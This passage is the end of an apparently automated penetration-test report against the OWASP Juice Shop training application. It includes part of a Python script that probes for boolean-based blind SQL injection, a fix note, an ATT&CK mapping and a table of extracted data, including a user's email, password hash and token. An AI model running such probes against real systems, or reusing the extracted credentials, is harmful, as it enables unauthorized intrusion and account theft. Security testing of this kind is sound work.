    response_false = httpx.post(url, json=sqli_false)
    print(f"SQLi FALSE condition - Status: {response_false.status_code}")
    
    # In boolean-based blind SQL injection, different conditions 
    # should produce different responses or response times
    print(f"\nComparison:")
    print(f"Normal vs TRUE: {response_normal.status_code} vs {response_true.status_code}")
    print(f"Normal vs FALSE: {response_normal.status_code} vs {response_false.status_code}")
    print(f"TRUE vs FALSE: {response_true.status_code} vs {response_false.status_code}")
    
    if response_true.status_code != response_false.status_code:
        print("\nVULNERABILITY CONFIRMED: Different responses for TRUE vs FALSE conditions")
        print("This is characteristic of boolean-based blind SQL injection")
    else:
        print("\nNo difference detected in responses")
        
except Exception as e:
    print(f"Error: {e}")
```

**Fix.** Sanitize and validate all user inputs, especially JSON payloads, before using them in database queries. Implement prepared statements or parameterized queries to prevent SQL injection attacks.

## ATT&CK coverage

| Technique | Findings |
|---|---|
| `T1059.007` | W-060 |
| `T1068` | W-001 |
| `T1078` | W-007, W-036 |
| `T1110.001` | W-036 |
| `T1190` | W-016, W-020 |
| `T1211` | W-047 |
| `T1213` | W-001, W-052 |

## Interesting data collected

Data the exploitation stage extracted while proving the findings above. Treat as sensitive.

| Type | Value | Source |
|---|---|---|
| {"config" | `{"server":{"port":3000,"basePath":"","baseUrl":"http://localhost:3000"},"application":{"domain":"juice-sh.op","name":"OWASP Juice Shop","logo":"JuiceShop_Logo.p` | W-001 |
| note | `Application configuration data including server port, base URL, application domain, name, logo, favicon, theme, and other settings.` | W-004 |
| version | `17.1.1` | W-007 |
| challenge_data | `{"id":74,"key":"scoreBoardChallenge","name":"Score Board","category":"Miscellaneous","tags":"Tutorial,Code Analysis","description":"Find the carefully hidden 'S` | W-016 |
| DBMS | `SQLite` | W-020 |
| note | `<none>` | W-033 |
| captcha | `2*10*6, answer: 120` | W-046 |
| captcha | `9-8*2, answer: -7` | W-047 |
| endpoint | `/rest/memories/, parameter: caption` | W-060 |
| email | `bjoern@owasp.org, password hash: 9283f1b2e9669749081963be0462e466, deluxeToken: efe2f1599` | W-061 |
| email | `bjoern@owasp.org, role: deluxe, deluxeToken: efe2f1599` | W-062 |

## Caveats and limitations

These bound how far the results above can be relied on.

- Produced by an autonomous pipeline with no human review. Findings should be validated by a security engineer before remediation is prioritised or the results are shared externally.
- Only proven findings are listed. Of 63 candidate weakness(es), 63 were tested for exploitability and 20 were proven; the remainder are hypotheses and are not reported as findings.
- The crawl hit a configured limit after 5 pages, so the asset map is a lower bound and parts of the application were never seen.
- Absence of a finding is not evidence of absence. This engagement covered what the crawler reached within its configured bounds.
